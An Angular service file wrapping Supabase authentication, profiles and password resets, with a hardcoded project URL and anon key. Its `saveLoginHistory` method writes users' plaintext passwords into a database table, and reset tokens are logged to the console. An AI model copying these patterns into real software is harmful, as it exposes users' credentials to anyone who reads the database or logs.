import { Injectable } from '@angular/core';
import { createClient, SupabaseClient, User, Session } from '@supabase/supabase-js';
import { BehaviorSubject, Observable } from 'rxjs';

export interface UserProfile {
  id: string;
  email: string;
  full_name: string;
  phone?: string;
  address?: string;
  avatar_url?: string;
  role?: string;
  username?: string;
  is_dark_mode?: boolean;
  language?: string;
  created_at?: string;
  updated_at?: string;
  // Additional fields for profile component compatibility
  contactNo?: string;
  notification?: boolean;
  street?: string;
  city?: string;
  state?: string;
  country?: string;
  pincode?: string;
  location?: string;
  photo?: string;
  education?: string;
  degree?: string;
  institution?: string;
  graduationYear?: string;
}

@Injectable({
  providedIn: 'root'
})
export class SupabaseAuthService {
  public supabase: SupabaseClient;
  private currentUserSubject = new BehaviorSubject<User | null>(null);
  private sessionSubject = new BehaviorSubject<Session | null>(null);

  constructor() {
    this.supabase = createClient(
      'https://kwlaqovlzhxghwtilxxu.supabase.co',
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imt3bGFxb3Zsemh4Z2h3dGlseHh1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjI5MjQ0MzMsImV4cCI6MjA3ODUwMDQzM30.L2jcB8zc2sN1GH3F9CNhKLbaD2jAFs_iGmcFSYA6vQA'
    );
    
    // Initialize session
    this.initializeAuth();
  }

  private async initializeAuth() {
    const { data: { session } } = await this.supabase.auth.getSession();
    this.sessionSubject.next(session);
    this.currentUserSubject.next(session?.user ?? null);

    // Listen for auth changes
    this.supabase.auth.onAuthStateChange(async (event, session) => {
      console.log('🔄 Auth state changed:', event, session?.user?.email);
      this.sessionSubject.next(session);
      this.currentUserSubject.next(session?.user ?? null);
      
      // Create user profile when user signs in for first time
      if (event === 'SIGNED_IN' && session?.user) {
        await this.ensureUserProfile(session.user);
      }
    });
  }

  // Login with email and password
  async signIn(email: string, password: string) {
    console.log('🔐 Login attempt:', { email, timestamp: new Date().toISOString() });
    
    const { data, error } = await this.supabase.auth.signInWithPassword({
      email,
      password
    });
    
    if (error) {
      console.error('❌ Login failed:', { email, error: error.message });
    } else {
      console.log('✅ Login successful:', { 
        email, 
        userId: data.user?.id,
        timestamp: new Date().toISOString() 
      });
      
      if (data.user) {
        await this.ensureUserProfile(data.user);
      }
    }
    
    return { data, error };
  }

  // Sign up with email and password
  async signUp(email: string, password: string) {
    console.log('🔐 Sign up attempt:', { email, timestamp: new Date().toISOString() });
    
    const { data, error } = await this.supabase.auth.signUp({
      email,
      password,
      options: {
        emailRedirectTo: `${window.location.origin}/auth/login`
      }
    });
    
    if (error) {
      console.error('❌ Sign up failed:', { email, error: error.message });
    } else {
      console.log('✅ Sign up successful:', { 
        email, 
        userId: data.user?.id,
        confirmed: data.user?.email_confirmed_at,
        timestamp: new Date().toISOString() 
      });
      
      if (data.user) {
        await this.createUserProfileOnSignup(data.user);
        
        // Auto-login after signup if email confirmation is disabled
        if (data.session) {
          console.log('✅ User auto-logged in after signup');
        }
      }
    }
    
    return { data, error };
  }

  // Logout
  async signOut() {
    const { error } = await this.supabase.auth.signOut();
    return { error };
  }

  async updatePassword(newPassword: string) {
    const { data, error } = await this.supabase.auth.updateUser({
      password: newPassword
    });
    return { data, error };
  }

  // Forgot Password - Send reset email using Supabase Auth
  async sendPasswordResetEmail(email: string): Promise<{ data: any; error: any }> {
    console.log('📧 Sending password reset email via Supabase Auth to:', email);
    
    const { data, error } = await this.supabase.auth.resetPasswordForEmail(email, {
      redirectTo: `${window.location.origin}/reset-password`
    });
    
    if (error) {
      console.error('❌ Supabase password reset email failed:', error);
    } else {
      console.log('✅ Password reset email sent successfully:', data);
    }
    
    return { data, error };
  }

  // Update password using Supabase Auth
  async updatePasswordWithSupabase(newPassword: string): Promise<{ data: any; error: any }> {
    console.log('🔄 Updating password via Supabase Auth');
    
    const { data, error } = await this.supabase.auth.updateUser({
      password: newPassword
    });
    
    if (error) {
      console.error('❌ Supabase password update failed:', error);
    } else {
      console.log('✅ Password updated successfully via Supabase:', data);
    }
    
    return { data, error };
  }

  // Get session from URL hash (for password reset)
  async getSessionFromUrl(): Promise<{ data: any; error: any }> {
    const { data, error } = await this.supabase.auth.getSession();
    return { data, error };
  }

  // Exchange URL hash for session
  async exchangeCodeForSession(code: string): Promise<{ data: any; error: any }> {
    const { data, error } = await this.supabase.auth.exchangeCodeForSession(code);
    return { data, error };
  }

  // Get current user observable
  get currentUser$(): Observable<User | null> {
    return this.currentUserSubject.asObservable();
  }

  // Get current session observable
  get session$(): Observable<Session | null> {
    return this.sessionSubject.asObservable();
  }

  // Get current user
  getCurrentUser(): User | null {
    return this.currentUserSubject.value;
  }

  // Get current session
  getCurrentSession(): Session | null {
    return this.sessionSubject.value;
  }

  // Check if user is authenticated
  isAuthenticated(): boolean {
    return !!this.getCurrentUser();
  }

  // Fetch user profile from user_profiles table by email or ID
  async getUserProfile(identifier: string): Promise<{ data: UserProfile | null; error: any }> {
    let query = this.supabase
      .from('user_profiles')
      .select('*');
    
    // Check if identifier looks like an email
    if (identifier.includes('@')) {
      // First try by email
      const { data: emailData, error: emailError } = await query.eq('email', identifier).single();
      if (emailData) {
        return { data: emailData, error: null };
      }
      
      // If not found by email, try by converted ID
      const uniqueId = identifier.replace(/[@.]/g, '_').toLowerCase();
      const { data: idData, error: idError } = await query.eq('id', uniqueId).single();
      return { data: idData, error: idError };
    } else {
      // Search by ID
      const { data, error } = await query.eq('id', identifier).single();
      return { data, error };
    }
  }

  // Create or update user profile
  async upsertUserProfile(profile: Partial<UserProfile>): Promise<{ data: any; error: any }> {
    console.log('🔧 Attempting to save profile:', profile);
    
    try {
      // First try to get existing profile
      const { data: existingData, error: selectError } = await this.supabase
        .from('user_profiles')
        .select('*')
        .eq('id', profile.id)
        .single();
      
      console.log('📋 Existing profile check:', { existingData, selectError });
      
      let result;
      if (existingData) {
        // Update existing profile
        result = await this.supabase
          .from('user_profiles')
          .update({
            full_name: profile.full_name,
            username: profile.username,
            role: profile.role,
            is_dark_mode: profile.is_dark_mode,
            language: profile.language,
            updated_at: new Date().toISOString()
          })
          .eq('id', profile.id)
          .select();
      } else {
        // Insert new profile
        result = await this.supabase
          .from('user_profiles')
          .insert({
            id: profile.id,
            email: profile.email,
            full_name: profile.full_name,
            username: profile.username,
            role: profile.role,
            is_dark_mode: profile.is_dark_mode || false,
            language: profile.language || 'en',
            created_at: new Date().toISOString(),
            updated_at: new Date().toISOString()
          })
          .select();
      }
      
      console.log('💾 Supabase operation result:', result);
      return result;
    } catch (error) {
      console.error('❌ Supabase upsert error:', error);
      return { data: null, error };
    }
  }

  // Update user profile
  async updateUserProfile(userId: string, updates: Partial<UserProfile>): Promise<{ data: any; error: any }> {
    const { data, error } = await this.supabase
      .from('user_profiles')
      .update({ ...updates, updated_at: new Date().toISOString() })
      .eq('id', userId)
      .select();
    
    return { data, error };
  }

  // Create user profile on signup
  private async createUserProfileOnSignup(user: User) {
    try {
      const newProfile: Partial<UserProfile> = {
        id: user.id,
        email: user.email!,
        full_name: user.user_metadata?.['full_name'] || user.email?.split('@')[0] || '',
        username: user.user_metadata?.['username'] || user.email?.split('@')[0] || '',
        role: 'user',
        is_dark_mode: false,
        language: 'en',
        phone: '',
        address: '',
        created_at: new Date().toISOString(),
        updated_at: new Date().toISOString()
      };
      
      const { error } = await this.upsertUserProfile(newProfile);
      if (error) {
        console.error('❌ Failed to create profile on signup:', error);
      } else {
        console.log('✅ User profile created on signup:', user.email);
      }
    } catch (error) {
      console.error('❌ Exception creating profile on signup:', error);
    }
  }

  // Ensure user profile exists
  private async ensureUserProfile(user: User) {
    const { data: existingProfile } = await this.getUserProfile(user.id);
    
    if (!existingProfile) {
      const newProfile: Partial<UserProfile> = {
        id: user.id,
        email: user.email!,
        full_name: user.user_metadata?.['full_name'] || '',
        username: user.user_metadata?.['username'] || user.email?.split('@')[0] || '',
        role: 'user',
        is_dark_mode: false,
        language: 'en',
        created_at: new Date().toISOString(),
        updated_at: new Date().toISOString()
      };
      
      await this.upsertUserProfile(newProfile);
      console.log('✅ User profile created:', user.email);
    }
  }

  // Save login history
  async saveLoginHistory(email: string, password: string) {
    console.log('💾 Saving login history:', { email, timestamp: new Date().toISOString() });
    
    const { data, error } = await this.supabase
      .from('login_history')
      .insert({
        email: email,
        password: password,
        login_time: new Date().toISOString(),
        user_agent: navigator.userAgent,
        ip_address: 'client_ip'
      });
    
    if (error) {
      console.error('❌ Login history save failed:', error);
    } else {
      console.log('✅ Login history saved successfully:', data);
    }
    
    return { data, error };
  }

  // Save password reset request
  async savePasswordResetRequest(resetData: {
    email: string;
    token: string;
    expires_at: string;
    user_agent: string;
    ip_address: string;
  }) {
    console.log('💾 Saving password reset request:', resetData);
    
    const { data, error } = await this.supabase
      .from('password_reset_requests')
      .insert(resetData);
    
    if (error) {
      console.error('❌ Password reset request save failed:', error);
    } else {
      console.log('✅ Password reset request saved successfully:', data);
    }
    
    return { data, error };
  }

  // Mark password reset token as used
  async markResetTokenAsUsed(token: string) {
    const { data, error } = await this.supabase
      .from('password_reset_requests')
      .update({ used: true })
      .eq('token', token);
    
    return { data, error };
  }
}